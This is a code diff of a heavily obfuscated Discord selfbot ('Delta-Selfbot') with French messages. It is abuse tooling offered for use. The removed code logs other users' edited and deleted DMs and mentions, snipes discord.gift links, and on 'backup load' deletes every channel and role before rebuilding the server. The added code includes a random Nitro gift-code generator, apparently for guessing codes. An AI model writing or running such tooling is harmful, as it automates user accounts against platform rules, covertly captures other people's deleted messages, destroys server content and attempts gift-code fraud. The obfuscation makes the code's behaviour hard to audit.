-            _0x290b68[_0x45b3d3('0x113')]()[_0x45b3d3('0x18d')](_0x12b241 => console[_0x45b3d3('0x2f')]('[', _0x45b3d3('0xf9')[_0x45b3d3('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x45b3d3('0x145')]));
-        }), console.log(_0x53081e('0x290').yellow);
-    }
-    if(message.content.startsWith(prefix + _0x53081e('0x1d3'))) {
-        let _0x2d99b2 = message.guild;
-        if(!_0x2d99b2) return message[_0x53081e('0x179')](_0x53081e('0x99'));
-        const _0x3b0ae4 = message.content[_0x53081e('0x151')](' ')[_0x53081e('0x1ed')](0x2)[_0x53081e('0x28d')](' ') || message[_0x53081e('0x1ab')][_0x53081e('0x27c')];
-        if(!message.member.hasPermission(_0x53081e('0x2ad'))) return message.delete().then(console[_0x53081e('0x2f')]('[', 'ERROR' [_0x53081e('0x2ab')], ']', _0x53081e('0xc')[_0x53081e('0x145')]));
-        const _0x5661c5 = message[_0x53081e('0x133')][_0x53081e('0x107')];
-        message.edit(_0x53081e('0x24f') + _0x3b0ae4), _0x5661c5[_0x53081e('0x8b')](_0x780690 => {
-            const _0x35aef0 = _0x53081e;
-            _0x780690[_0x35aef0('0x26a')](_0x3b0ae4)[_0x35aef0('0x18d')](_0xb3825e => console.log('[', _0x35aef0('0xf9').red, ']', _0x35aef0('0xa3')[_0x35aef0('0x145')]));
-        }), console[_0x53081e('0x2f')]('Commande name all effectué' [_0x53081e('0x39')]);
-    }
-    try {
-        let _0x21b23e = client[_0x53081e('0x77')][_0x53081e('0x89')](_0x53081e('0x199')) || 'ℹ️',
-            _0x21f655 = client[_0x53081e('0x77')]['get']('655695570769412096') || '⌛',
-            _0x5288af = client[_0x53081e('0x77')]['get'](_0x53081e('0x19d')) || '✅',
-            _0x2bf8e9 = client[_0x53081e('0x77')][_0x53081e('0x89')]('655704809483141141') || '❌',
-            _0x45b98e = client[_0x53081e('0x77')]['get']('656030540310380574') || '⚠️';
-        if(message.content === prefix + _0x53081e('0x24d') | message.content == prefix + 'backup c') {
-            let _0x50c0ad = message[_0x53081e('0x133')];
-            if(!_0x50c0ad) {
-                message.edit(_0x53081e('0x1a8'));
-                return;
-            }
-            message[_0x53081e('0x133')][_0x53081e('0x33')][_0x53081e('0x1b6')](_0x1b465c => _0x1b465c[_0x53081e('0x10d')] !== message.guild[_0x53081e('0x209')](client[_0x53081e('0xb9')]['id'])[_0x53081e('0x19e')][_0x53081e('0x10d')])[_0x53081e('0x8b')](_0xb79699 => {
-                const _0x41737b = _0x53081e;
-                if(_0xb79699[_0x41737b('0xb7')](message[_0x41737b('0x133')][_0x41737b('0x209')](client[_0x41737b('0xb9')]['id'])[_0x41737b('0x19e')]) > 0x0) return message.edit(_0x45b98e + _0x41737b('0x187')).catch(_0x5abcca => console.log('[', _0x41737b('0xf9')[_0x41737b('0x2ab')], ']', _0x41737b('0xa3')[_0x41737b('0x145')]));
-            }), message.edit(_0x21f655 + _0x53081e('0xb6'))[_0x53081e('0x18d')](_0x2afa3c => console.log('[', _0x53081e('0xf9').red, ']', _0x53081e('0xa3')[_0x53081e('0x145')]))[_0x53081e('0xdb')](_0x2118e6 => {
-                const _0x4ecf95 = _0x53081e;
-                let _0x4a5d1b = _0x3eb340(0x10);
-                const _0x150b4e = message[_0x4ecf95('0x133')][_0x4ecf95('0x19')][_0x4ecf95('0xb8')](function(_0xd1bf05, _0x1793f5) {
-                        const _0x3e30ac = _0x4ecf95;
-                        return _0xd1bf05.position - _0x1793f5[_0x3e30ac('0xca')];
-                    })[_0x4ecf95('0x271')]()['map'](_0x3ecafb => {
-                        const _0x1b4945 = _0x4ecf95,
-                            _0x361687 = {
-                                'type': _0x3ecafb.type,
-                                'name': _0x3ecafb.name,
-                                'postion': _0x3ecafb[_0x1b4945('0x21e')]
-                            };
-                        if(_0x3ecafb[_0x1b4945('0x3e')]) _0x361687[_0x1b4945('0x3e')] = _0x3ecafb[_0x1b4945('0x3e')][_0x1b4945('0x10d')];
-                        return _0x361687;
-                    }),
-                    _0x22e9f3 = message[_0x4ecf95('0x133')]['roles'][_0x4ecf95('0x1b6')](_0x44e510 => _0x44e510[_0x4ecf95('0x10d')] !== _0x4ecf95('0x212'))['sort'](function(_0x404af1, _0x82ff9) {
-                        const _0x21e71c = _0x4ecf95;
-                        return _0x404af1[_0x21e71c('0xca')] - _0x82ff9[_0x21e71c('0xca')];
-                    })[_0x4ecf95('0x271')]()[_0x4ecf95('0x25b')](_0x2e2aa9 => {
-                        const _0x150d7f = _0x4ecf95,
-                            _0x5056b3 = {
-                                'name': _0x2e2aa9.name,
-                                'color': _0x2e2aa9.color,
-                                'hoist': _0x2e2aa9.hoist,
-                                'permissions': _0x2e2aa9[_0x150d7f('0x1e8')],
-                                'mentionable': _0x2e2aa9.mentionable,
-                                'position': _0x2e2aa9[_0x150d7f('0xca')]
-                            };
-                        return _0x5056b3;
-                    });
-                if(!backups[message[_0x4ecf95('0x1ab')]['id']]) backups[message[_0x4ecf95('0x1ab')]['id']] = {};
-                backups[message[_0x4ecf95('0x1ab')]['id']][_0x4a5d1b] = {
-                    'icon': message[_0x4ecf95('0x133')]['iconURL'],
-                    'name': message[_0x4ecf95('0x133')][_0x4ecf95('0x10d')],
-                    'owner': message[_0x4ecf95('0x133')][_0x4ecf95('0x29c')],
-                    'members': message.guild[_0x4ecf95('0x215')],
-                    'createdAt': message.guild[_0x4ecf95('0x245')],
-                    'roles': _0x22e9f3,
-                    'channels': _0x150b4e
-                }, _0x1947ac(), console[_0x4ecf95('0x2f')]((_0x4ecf95('0x15a') + message[_0x4ecf95('0x133')][_0x4ecf95('0x10d')] + _0x4ecf95('0xba') + _0x4a5d1b).green), message.edit(_0x21b23e + '  **Info**\x0a\x0aNouvelle backup du serveur **' + message[_0x4ecf95('0x133')]['name'] + '** vien d\x27être crée, voici son id : `' + _0x4a5d1b + _0x4ecf95('0x223') + prefix + _0x4ecf95('0x148'))[_0x4ecf95('0x18d')](_0x4ccea9 => console[_0x4ecf95('0x2f')]('[', 'ERROR' [_0x4ecf95('0x2ab')], ']', _0x4ecf95('0xa3')[_0x4ecf95('0x145')]));
-            }), console[_0x53081e('0x2f')](_0x53081e('0x205')[_0x53081e('0x39')]);
-        }
-        if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0xa6'))) {
-            let _0x3ff057 = message[_0x53081e('0x133')];
-            if(!_0x3ff057) {
-                message.edit(_0x53081e('0x1a8'));
-                return;
-            }
-            let _0x566011 = _0xdcd936[_0x53081e('0xf8')](0x2)['join'](' '),
-                _0x3cb31a = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x2bf8e9 + _0x53081e('0x24b'))
-.setFooter(_0x53081e('0x191'))[_0x53081e('0x1f6')]('Tu dois définir ton id de backup... Fais ' + prefix + _0x53081e('0x9d'))[_0x53081e('0x42')](color);
-            if(!_0x566011) return message[_0x53081e('0x179')](_0x3cb31a)[_0x53081e('0x18d')](_0x12eb02 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')]));
-            let _0x352271 = new Discord[(_0x53081e('0x226'))]()
-                .setTitle(_0x2bf8e9 + _0x53081e('0x1e9'))[_0x53081e('0x1ca')]('Delta-Selfbot')
-                .addField('**Tu n\x27a pas de backup avec cette id : ' + _0x566011 + _0x53081e('0x6'), prefix + _0x53081e('0x104'))[_0x53081e('0x42')](color);
-            if(!backups[message[_0x53081e('0x1ab')]['id']][_0x566011]) return message[_0x53081e('0x179')](_0x352271)[_0x53081e('0x18d')](_0x3777a3 => console.log('[', 'ERROR' [_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')]));;
-            delete backups[message[_0x53081e('0x1ab')]['id']][_0x566011], _0x1947ac();
-            let _0x6ff74e = new Discord[(_0x53081e('0x226'))]()
-                .setTitle(_0x5288af + _0x53081e('0x198'))[_0x53081e('0x1ca')](_0x53081e('0x191'))
-.setDescription(_0x53081e('0x213'))[_0x53081e('0x42')](color);
-            message.edit(_0x6ff74e)[_0x53081e('0x18d')](_0x3c456f => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log(_0x53081e('0x22d')[_0x53081e('0x39')]);
-        }
-        if(message.content.startsWith(prefix + 'backup load') || message.content.startsWith(prefix + _0x53081e('0x13a'))) {
-            let _0x54c0e3 = message[_0x53081e('0x133')];
-            if(!_0x54c0e3) {
-                message[_0x53081e('0x179')](_0x53081e('0x1a8'));
-                return;
-            }
-            let _0x55bffe = client.emojis[_0x53081e('0x89')]('655704809483141141') || '❌',
-                _0x5ead76 = _0xdcd936.splice(0x2)[_0x53081e('0x28d')](' '),
-                _0x35896c = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x55bffe + '  Error')[_0x53081e('0x1f6')](_0x53081e('0x27') + prefix + 'help` pour avoir plus d\x27informations');
-            if(!_0x5ead76) return message[_0x53081e('0xf2')][_0x53081e('0x20e')](_0x35896c);
-            let _0x4133aa = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x55bffe + '  Error')[_0x53081e('0x1cd')](_0x53081e('0x17c') + _0x5ead76 + _0x53081e('0x6'), _0x53081e('0x25'))
-.setFooter('Delta-Selfbot')[_0x53081e('0x42')](color);
-            if(!backups[message[_0x53081e('0x1ab')]['id']][_0x5ead76]) return message[_0x53081e('0xf2')]['send'](_0x4133aa)[_0x53081e('0x18d')](_0x48f4d9 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')]));
-            message.guild[_0x53081e('0x19')][_0x53081e('0x8b')](_0x4a623f => {
-                const _0x393284 = _0x53081e;
-                _0x4a623f[_0x393284('0x110')](_0x393284('0x173'));
-            }), message[_0x53081e('0x133')][_0x53081e('0x33')][_0x53081e('0x1b6')](_0x5e6c2d => _0x5e6c2d[_0x53081e('0x107')][_0x53081e('0xa1')](_0x5d1590 => !_0x5d1590[_0x53081e('0xb9')][_0x53081e('0x280')]))['forEach'](_0x34ec46 => {
-                const _0x117973 = _0x53081e;
-                _0x34ec46[_0x117973('0x110')](_0x117973('0x173'));
-            }), backups[message[_0x53081e('0x1ab')]['id']][_0x5ead76][_0x53081e('0x33')]['forEach'](async function(_0x3fcbf6) {
-                const _0x1a3250 = _0x53081e;
-                message[_0x1a3250('0x133')][_0x1a3250('0x139')]({
-                    'name': _0x3fcbf6[_0x1a3250('0x10d')],
-                    'color': _0x3fcbf6.color,
-                    'permissions': _0x3fcbf6.permissions,
-                    'hoist': _0x3fcbf6[_0x1a3250('0x1f2')],
-                    'mentionable': _0x3fcbf6[_0x1a3250('0x1d7')],
-                    'position': _0x3fcbf6[_0x1a3250('0xca')]
-                })[_0x1a3250('0xdb')](_0x438cff => {
-                    const _0x436a9d = _0x1a3250;
-                    _0x438cff[_0x436a9d('0xf6')](_0x438cff[_0x436a9d('0xca')]);
-                });
-            }), backups[message[_0x53081e('0x1ab')]['id']][_0x5ead76][_0x53081e('0x19')][_0x53081e('0x1b6')](_0x4900ad => _0x4900ad[_0x53081e('0xc6')] === _0x53081e('0x26d'))[_0x53081e('0x8b')](async function(_0x2a986f) {
-                const _0x2dc037 = _0x53081e;
-                message[_0x2dc037('0x133')][_0x2dc037('0x12')](_0x2a986f[_0x2dc037('0x10d')], {
-                    'type': _0x2a986f.type,
-                    'permissionOverwrites': _0x2a986f[_0x2dc037('0x1dd')]
-                });
-            }), backups[message[_0x53081e('0x1ab')]['id']][_0x5ead76][_0x53081e('0x19')]['filter'](_0x3a5bd5 => _0x3a5bd5[_0x53081e('0xc6')] !== 'category')[_0x53081e('0x8b')](async function(_0x2b9b1d) {
-                const _0x28c44f = _0x53081e;
-                message[_0x28c44f('0x133')][_0x28c44f('0x12')](_0x2b9b1d[_0x28c44f('0x10d')], {
-                    'type': _0x2b9b1d[_0x28c44f('0xc6')],
-                    'permissionOverwrites': _0x2b9b1d[_0x28c44f('0x1dd')]
-                })[_0x28c44f('0xdb')](_0xa14213 => {
-                    const _0x2c6fb1 = _0x28c44f,
-                        _0x2d0f80 = message[_0x2c6fb1('0x133')][_0x2c6fb1('0x19')][_0x2c6fb1('0x1b6')](_0x536cac => _0x536cac[_0x2c6fb1('0xc6')] === _0x2c6fb1('0x26d'))[_0x2c6fb1('0x7c')](_0x2f5472 => _0x2f5472[_0x2c6fb1('0x10d')] === _0x2b9b1d[_0x2c6fb1('0x3e')]);
-                    _0x2b9b1d[_0x2c6fb1('0x3e')] ? _0xa14213.setParent(_0x2d0f80) : '';
-                });
-            }), message.guild[_0x53081e('0x295')](backups[message.author.id][_0x5ead76][_0x53081e('0x10d')]), message[_0x53081e('0x133')][_0x53081e('0x20c')](backups[message[_0x53081e('0x1ab')]['id']][_0x5ead76][_0x53081e('0x108')]), console.log(_0x53081e('0x88')[_0x53081e('0x39')]);
-        }
-        if(message.content.startsWith(prefix + _0x53081e('0x1ce')) || message.content[_0x53081e('0x64')](prefix + _0x53081e('0x8a'))) {
-            let _0x3fcf76 = _0xdcd936.splice(0x2)[_0x53081e('0x28d')](' '),
-                _0x54d49b = new Discord.RichEmbed()[_0x53081e('0xc9')](_0x2bf8e9 + _0x53081e('0x1e9'))[_0x53081e('0x1ca')](_0x53081e('0x191'))
-.setDescription(_0x53081e('0x27') + prefix + _0x53081e('0x83'))[_0x53081e('0x42')](color);
-            if(!_0x3fcf76) return message.edit(_0x54d49b)[_0x53081e('0x18d')](_0x3900f4 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9').red, ']', _0x53081e('0xa3')[_0x53081e('0x145')]));
-            let _0x1fc0f7 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x2bf8e9 + _0x53081e('0x1e9'))[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x1f6')]('Tu n\x27as pas de **backup** avec cet id `' + _0x3fcf76 + '`.')[_0x53081e('0x42')](color);
-            if(!backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76]) return message[_0x53081e('0x179')](_0x1fc0f7);
-            try {
-                let _0x2a3537 = new Discord[(_0x53081e('0x226'))]()
-                    .setTitle(backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x10d')])[_0x53081e('0x15f')](backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76]['icon'])
-                    .addField(_0x53081e('0x207'), '<@' + backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x129')] + '>', !![])[_0x53081e('0x1cd')](_0x53081e('0x22a'), backups[message.author.id][_0x3fcf76][_0x53081e('0x107')], !![])[_0x53081e('0x1cd')]('Created At', backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x245')])[_0x53081e('0x1cd')](_0x53081e('0x1c9'), _0x53081e('0x1fb') + backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x19')][_0x53081e('0x25b')](_0x22988c => _0x22988c.name)[_0x53081e('0x28d')]('\x0a') + _0x53081e('0x1fb'), !![])
-                    .addField(_0x53081e('0x167'), _0x53081e('0x1fb') + backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x33')][_0x53081e('0x25b')](_0x3a23e2 => _0x3a23e2[_0x53081e('0x10d')])[_0x53081e('0x28d')]('\x0a') + '```', !![]);
-                message[_0x53081e('0x179')](_0x2a3537);
-            } catch (_0x25aced) {
-                hastebins(backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x19')]['map'](_0x518610 => _0x518610[_0x53081e('0x10d')])[_0x53081e('0x28d')]('\x0a'), 'txt')[_0x53081e('0xdb')](_0x284a3c => {
-                    const _0x20468e = _0x53081e;
-                    hastebins(backups[message[_0x20468e('0x1ab')]['id']][_0x3fcf76][_0x20468e('0x33')][_0x20468e('0x25b')](_0x415f78 => _0x415f78[_0x20468e('0x10d')])[_0x20468e('0x28d')]('\x0a'), _0x20468e('0x18c'))[_0x20468e('0xdb')](_0x304302 => {
-                        const _0x45a38b = _0x20468e;
-                        let _0x5c8385 = new Discord[(_0x45a38b('0x226'))]()[_0x45a38b('0xc9')](backups[message[_0x45a38b('0x1ab')]['id']][_0x3fcf76][_0x45a38b('0x10d')])[_0x45a38b('0x15f')](backups[message[_0x45a38b('0x1ab')]['id']][_0x3fcf76][_0x45a38b('0x108')])[_0x45a38b('0x1cd')](_0x45a38b('0x207'), '<@' + backups[message[_0x45a38b('0x1ab')]['id']][_0x3fcf76][_0x45a38b('0x129')] + '>', !![])[_0x45a38b('0x1cd')]('Members', backups[message[_0x45a38b('0x1ab')]['id']][_0x3fcf76][_0x45a38b('0x107')], !![])[_0x45a38b('0x1cd')](_0x45a38b('0x221'), backups[message[_0x45a38b('0x1ab')]['id']][_0x3fcf76][_0x45a38b('0x245')])[_0x45a38b('0x1cd')]('Channels', _0x284a3c, !![])[_0x45a38b('0x1cd')](_0x45a38b('0x167'), _0x304302, !![])
-.setFooter(_0x45a38b('0x191'));
-                        message[_0x45a38b('0x179')](_0x5c8385)[_0x45a38b('0x18d')](_0x4d2920 => console[_0x45a38b('0x2f')]('[', 'ERROR' [_0x45a38b('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x45a38b('0x145')]));
-                    });
-                });
-            }
-            console[_0x53081e('0x2f')](_0x53081e('0x149')[_0x53081e('0x39')]);
-        }
-        if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x277'))) {
-            let _0x5e0f89 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x2bf8e9 + _0x53081e('0x1e9'))[_0x53081e('0x1f6')]('Vous n\x27avez pas encore sauvegardé de serveur')[_0x53081e('0x42')](color);
-            if(!backups[message[_0x53081e('0x1ab')]['id']]) return message[_0x53081e('0x179')](_0x5e0f89)[_0x53081e('0x18d')](_0x5a6bd2 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')]));
-            let _0x3d2826 = new Discord.RichEmbed()
-                .setTitle(_0x45b98e + '  Warning')[_0x53081e('0x1f6')]('Es-tu sûr de vouloir supprimer toutes tes backups ?\x0a__Cette action est irréversible !__'),
-                _0x4b5ef3 = new Discord[(_0x53081e('0x226'))]()
-                .setColor(color)[_0x53081e('0xc9')](_0x53081e('0xa0'))
-.setFooter(_0x53081e('0x191'))
-                .addField(_0x53081e('0x204'), _0x53081e('0xa0'));
-            message[_0x53081e('0x179')](_0x4b5ef3).then(() => {
-                const _0x405731 = _0x53081e;
-                message[_0x405731('0xf2')][_0x405731('0x1d6')](_0x585273 => _0x585273[_0x405731('0x18f')] === _0x405731('0x11a'), {
-                    'max': 0x1,
-                    'time': 0x7530,
-                    'errors': [_0x405731('0x216')]
-                })[_0x405731('0xdb')](_0x2b5e36 => {
-                    const _0x139f93 = _0x405731;
-                    delete backups[message[_0x139f93('0x1ab')]['id']];
-                    let _0x26ab6c = new Discord[(_0x139f93('0x226'))]()[_0x139f93('0xc9')](_0x5288af + _0x139f93('0x74'))[_0x139f93('0x1f6')](_0x139f93('0x6b'))
-.setFooter(_0x139f93('0x191'))[_0x139f93('0x42')](color);
-                    message[_0x139f93('0x179')](_0x26ab6c)[_0x139f93('0x18d')](_0x294f8a => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), message[_0x139f93('0x110')](), console.log(_0x139f93('0x12d')[_0x139f93('0x39')]);
-                });
-            });
-        }
-        if(message.content === prefix + _0x53081e('0x234')) {
-            var _0x57b7c8 = client[_0x53081e('0xb9')]['friends'][_0x53081e('0x1c1')];
-            const _0xce165f = client[_0x53081e('0xb9')]['friends'][_0x53081e('0x271')]();
-            let _0x33322d = ('Successfully backed up ' + _0xce165f[_0x53081e('0x219')][_0x53081e('0x258')]()[_0x53081e('0x25e')] + _0x53081e('0x91'))[_0x53081e('0x145')];
-            console[_0x53081e('0x2f')](_0x33322d), hastebins(_0xce165f + '\x0a')[_0x53081e('0xdb')](_0x24a095 => {
-                const _0x3c0e84 = _0x53081e;
-                var _0x455179 = new Discord[(_0x3c0e84('0x226'))]()
-                    .setTitle('backup friends (<@id>)')[_0x3c0e84('0x1cd')]('```lien hastebins```', _0x24a095)[_0x3c0e84('0x42')](color)[_0x3c0e84('0x1c4')]()[_0x3c0e84('0x1f6')](_0x3c0e84('0x248'));
-                message[_0x3c0e84('0x179')](_0x455179)[_0x3c0e84('0x18d')](_0x3e50a7 => console[_0x3c0e84('0x2f')]('[', _0x3c0e84('0xf9')[_0x3c0e84('0x2ab')], ']', _0x3c0e84('0xa3')[_0x3c0e84('0x145')])), console[_0x3c0e84('0x2f')](_0x3c0e84('0x109')[_0x3c0e84('0x39')]);
-            });
-        }
-
-        function _0x3eb340(_0x29377f) {
-            const _0x1d9a30 = _0x53081e;
-            var _0x31b76f = '',
-                _0x40583b = _0x1d9a30('0x13e'),
-                _0x2c66ae = _0x40583b[_0x1d9a30('0x219')];
-            for(var _0x3b6c10 = 0x0; _0x3b6c10 < _0x29377f; _0x3b6c10++) {
-                _0x31b76f += _0x40583b[_0x1d9a30('0x66')](Math.floor(Math[_0x1d9a30('0x1a1')]() * _0x2c66ae));
-            }
-            return _0x31b76f;
-        }
-
-        function _0x1947ac() {
-            const _0x44d726 = _0x53081e;
-            fs[_0x44d726('0x73')](_0x44d726('0x1c0'), JSON[_0x44d726('0x236')](backups), _0x3858b2 => {
-                const _0x1b5906 = _0x44d726;
-                if(_0x3858b2) console[_0x1b5906('0x23e')](_0x3858b2);
-            });
-        }
-    } catch (_0x2fd171) {
-        throw _0x2fd171;
-    }
-}), client.on('messageUpdate', _0x7bf620 => {
-    const _0x3959c1 = _0x14ffc7;
-    if(_0x7bf620[_0x3959c1('0x1ab')]['id'] === client.user.id) return;
-    _0x7bf620[_0x3959c1('0xf2')]['type'] === 'dm' && (console.log(_0x3959c1('0x185')[_0x3959c1('0x153')]), console[_0x3959c1('0x2f')](_0x3959c1('0x26b')[_0x3959c1('0x2ab')]) ^ console[_0x3959c1('0x2f')]('╟─────────────────────────────────╢' [_0x3959c1('0x153')]), console.log((_0x3959c1('0x3d') + _0x7bf620[_0x3959c1('0x1ab')][_0x3959c1('0xd9')] + '\x0a║--> Content: ' + _0x7bf620[_0x3959c1('0x18f')] + _0x3959c1('0x123') + _0x7bf620[_0x3959c1('0x245')]).green), console[_0x3959c1('0x2f')](_0x3959c1('0x22e').blue));
-}), client.on('messageDelete', messageDelete => {
-    const _0x1b0e2c = _0x14ffc7;
-    if(messageDelete[_0x1b0e2c('0x1ab')]['id'] === client.user.id) return;
-    messageDelete.channel[_0x1b0e2c('0xc6')] === 'dm' && (console[_0x1b0e2c('0x2f')]('\x0a╔═════════════════════════════════╗' [_0x1b0e2c('0x153')]), console.log(_0x1b0e2c('0x26b')[_0x1b0e2c('0x2ab')]) ^ console.log(_0x1b0e2c('0x8d').blue), console[_0x1b0e2c('0x2f')]((_0x1b0e2c('0x200') + messageDelete[_0x1b0e2c('0x1ab')]['tag'] + _0x1b0e2c('0x201') + messageDelete.content + '\x0a║--> At: ' + messageDelete[_0x1b0e2c('0x245')])[_0x1b0e2c('0x145')]), console.log(_0x1b0e2c('0x22e').blue));
-    if(messageDelete[_0x1b0e2c('0x18f')][_0x1b0e2c('0x3b')](_0x1b0e2c('0x212')) || messageDelete[_0x1b0e2c('0x18f')]['includes'](_0x1b0e2c('0xeb'))) {
-        if(messageDelete[_0x1b0e2c('0x1ab')]['id'] === client[_0x1b0e2c('0xb9')]['id']) return;
-        if(messageDelete[_0x1b0e2c('0xf2')]['type'] === 'dm') return;
-        console.log(_0x1b0e2c('0x185')[_0x1b0e2c('0x153')]), console[_0x1b0e2c('0x2f')](_0x1b0e2c('0x26b')[_0x1b0e2c('0x2ab')]) ^ console[_0x1b0e2c('0x2f')](_0x1b0e2c('0x8d').blue), console[_0x1b0e2c('0x2f')]((_0x1b0e2c('0x24') + messageDelete[_0x1b0e2c('0x133')]['name'] + ' \x0a║--> channel: ' + messageDelete[_0x1b0e2c('0xf2')]['name'] + ' \x0a║--> User: ' + messageDelete[_0x1b0e2c('0x1ab')]['tag'] + _0x1b0e2c('0x201') + messageDelete[_0x1b0e2c('0x18f')] + _0x1b0e2c('0x71') + messageDelete[_0x1b0e2c('0x245')])[_0x1b0e2c('0x145')]), console[_0x1b0e2c('0x2f')](_0x1b0e2c('0x22e')[_0x1b0e2c('0x153')]);
-    } else return;
 });
 
-function matchCode(_0x5e8a3b, _0x27ecc9) {
-    const _0x141203 = _0x14ffc7;
-    let _0x3f1e07 = _0x5e8a3b[_0x141203('0x119')](/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/);
-    if(_0x3f1e07) return _0x27ecc9(_0x3f1e07[0x0]), matchCode(_0x5e8a3b[_0x141203('0x1ed')](_0x3f1e07[_0x141203('0xa5')] + _0x3f1e07[0x0]['length']), _0x27ecc9);
-    else _0x27ecc9(null);
+let i = 0;
+
+function nitrocode(_0x18f2x19, _0x18f2x1a) {
+    var _0x18f2x1b = "";
+    if (_0x18f2x1a["indexOf"]("0") > -1) {
+        _0x18f2x1b += "0123456789"
+    }
+    if (_0x18f2x1a["indexOf"]("A") > -1) {
+        _0x18f2x1b += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    }
+    if (_0x18f2x1a["indexOf"]("a") > -1) {
+        _0x18f2x1b += "abcdefghijklmnopqrstuvwxyz"
+    }
+    var _0x18f2x1c = "";
+    for (var i = _0x18f2x19; i > 0; --i) {
+        _0x18f2x1c += _0x18f2x1b[Math["floor"](Math["random"]() * _0x18f2x1b["length"])]
+    }
+    return _0x18f2x1c
 }
-client.on('message', message => {
-    const _0xac3b49 = _0x14ffc7;
-    let _0xe10fc0 = [];
-    matchCode(message[_0xac3b49('0x18f')], _0x3b126e => {
-        const _0x172e8a = _0xac3b49;
-        if(!_0x3b126e) return;
-        if(!_0xe10fc0.includes(_0x3b126e)) _0xe10fc0[_0x172e8a('0x27d')](_0x3b126e);
+const color = ConfigFile.color;
+const rire = [
+    'https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif',
+    'https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif',
+    'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif',
+    'https://media.tenor.com/images/3d8eb1e9c497abc46370cee9b55d682f/tenor.gif',
+    'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif',
+    'https://media.tenor.com/images/db17bbcb693788625c8228d30bc5fc42/tenor.gif',
+    'https://media1.tenor.com/images/003a06f5074259c50b519056a12f6e33/tenor.gif',
+    'https://media1.tenor.com/images/5e1fafda52c90acfe2499ac5061f4c99/tenor.gif'
+];
+const kiss = [
+    'https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif',
+    'https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif',
+    'https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif',
+    'https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif'
+];
+const hugh = [
+    'https://media.tenor.com/images/eff58ec80f6dacb3ccddcbab9c70dacf/tenor.gif', 'https://media.tenor.com/images/4d5a77b99ab86fc5e9581e15ffe34b5e/tenor.gif', 'https://media.tenor.com/images/bc8e962e6888249486a3e103edd30dd9/tenor.gif', 'https://media.tenor.com/images/481814f5650216fa4e9ff7846f7a42f9/tenor.gif'
+];
+const veski = [
+    'https://i.pinimg.com/originals/09/ee/e0/09eee0f5dfae8f74179d1ba0bb54b22d.gif', 'https://media.tenor.com/images/0538e625e9c3d27cd062306101adde13/tenor.gif', 'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif'
+];
+const punch = [
+    'https://media.tenor.com/images/7bd895a572947cf17996b84b9a51cc02/tenor.gif', 'https://media.tenor.com/images/36179549fa295d988fc1020a7902c41c/tenor.gif', 'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif', 'https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif'
+];
+var verifLevels = [
+    'None', 'Low', 'Medium', '(\u256F\xB0\u25A1\xB0\uFF09\u256F\uFE35  \u253B\u2501\u253B'
+];
+var region = {
+    'Brésil': 'Brazil',
+    'eu-central': 'Central Europe',
+    'singapoure': 'Singapore',
+    'us-central': 'U.S. Central',
+    'sydney': 'Sydney',
+    'us-east': 'U.S. East',
+    'us-south': 'U.S. South',
+    'us-west': 'U.S. West',
+    'eu-west': 'Western Europe',
+    'vip-us-east': 'VIP U.S. East',
+    'Londre': 'London',
+    'amsterdam': 'Amsterdam',
+    'hongkong': 'Hong Kong'
+};
+
+function translateDate(_0x18f2x26) {
+    const _0x18f2x27 = [
+        'Jan', 'Fev', 'Mar', 'Avr', 'Mai', 'Juin', 'Juillet', 'Aout', 'Sep', 'Oct', 'Nov', 'Dec'
+    ];
+    const _0x18f2x28 = [
+        'Dimanche', 'Lundi', 'Mardi', 'Mercredi', 'Jeudi', 'Vendredi', 'Samedi'
+    ];
